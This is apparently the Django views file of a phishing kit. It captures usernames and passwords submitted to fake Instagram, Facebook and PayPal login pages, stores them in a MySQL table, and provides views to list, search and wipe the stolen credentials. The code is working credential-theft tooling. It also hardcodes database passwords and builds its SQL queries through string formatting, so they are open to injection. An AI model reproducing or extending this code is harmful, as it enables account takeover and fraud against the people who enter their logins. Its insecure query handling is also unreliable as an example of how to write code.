from django.shortcuts import render
import requests
import os
from subprocess import call
import sys
import mysql.connector as sqltor
def clearNone():
 mydb=sqltor.connect(user="vaishnav35",passwd="khaldrogo35",database="phdata")
 my_c=mydb.cursor()
 q="delete from phdata where username='None';"
 my_c.execute(q)
 mydb.commit()
 mydb.close()
 my_c.close()
def button(request):
 return render(request,"index.html")
def runInsta(request):
 app_id="Instagram"
 name_insta = request.POST.get('username')
 password_insta = request.POST.get('password')
 mydb=sqltor.connect(user="vaishnav35",passwd="khaldrogo35",database="phdata")
 my_c=mydb.cursor()
 q="insert into phdata values('{}','{}','{}')".format(app_id,name_insta,password_insta)
 my_c.execute(q)
 mydb.commit()
 mydb.close()
 my_c.close()
 clearNone()
 return render(request,'instagram.html')
def runFacebook(request):
 app_id1="Facebook"
 name_fb= request.POST.get("username")
 password_fb = request.POST.get("password")
 mydb=sqltor.connect(user="vaishnav35",passwd="khaldrogo35",database="phdata")
 my_c=mydb.cursor()
 q="insert into phdata values('{}','{}','{}')".format(app_id1,name_fb,password_fb)
 my_c.execute(q)
 mydb.commit()
 mydb.close()
 my_c.close()
 clearNone()
 return render(request,'facebook.html')
def runPaypal(request):
 app_id2="Paypal"
 name_pay = request.POST.get("login_email")
 password_pay = request.POST.get("login_password")
 mydb=sqltor.connect(user="vaishnav35",passwd="khaldrogo35",database="phdata")
 my_c=mydb.cursor()
 q="insert into phdata values('{}','{}','{}')".format(app_id2,name_pay,password_pay)
 my_c.execute(q)
 mydb.commit()
 mydb.close()
 my_c.close()
 clearNone()
 return render(request,'paypal.html')
def sqlGUI():
 mydb=sqltor.connect(user="vaishnav35",passwd="khaldrogo35",database="phdata")
 my_c=mydb.cursor()
 q="select * from phdata"
 my_c.execute(q)
 result = my_c.fetchcall()
 mydb.commit()
 mydb.close()
 my_c.close()
 print(result)
def home(request):
 return render(request,"lol.html")
 
def database(request):
 mydb=sqltor.connect(user="vaishnav35",passwd="khaldrogo35",database="phdata")
 my_c=mydb.cursor()
 q="select * from phdata"
 my_c.execute(q)
 s = my_c.fetchall()
 mydb.commit()
 mydb.close()
 my_c.close()
 l = ("Appid", "Username","Password")
 data=[]
 for key in s:
    if len(key) == len(l):
      res = {l[i] : key[i] for i, _ in enumerate(key)}
    data.append(res)
# print(data)
 context={'data':data}
 return render(request,"database.html",context)
 
def search(request):

  search = request.POST.get('search')
  mydb=sqltor.connect(user="vaishnav35",passwd="khaldrogo35",database="phdata")
  my_c=mydb.cursor()
  q="select * from phdata where username= ('{}')".format(search)
  my_c.execute(q)
  s1 = my_c.fetchall()
  mydb.commit()
  mydb.close()
  my_c.close()
 
  l1 = ("Appid", "Username","Password")
  data1=[]
  for key1 in s1:
    if len(key1) == len(l1):
      res1 = {l1[i] : key1[i] for i, _ in enumerate(key1)}
    data1.append(res1)
  context1={'data1':data1}
 
  return render(request, "search.html",context1)
 
def deleteEntry(request):
  search1 = request.POST.get('search')
 
  mydb=sqltor.connect(user="vaishnav35",passwd="khaldrogo35",database="phdata")
  my_c=mydb.cursor()
  q="delete from phdata"
  my_c.execute(q)
 
  mydb.commit()
  mydb.close()
  my_c.close()
  return render(request,"delete.html")

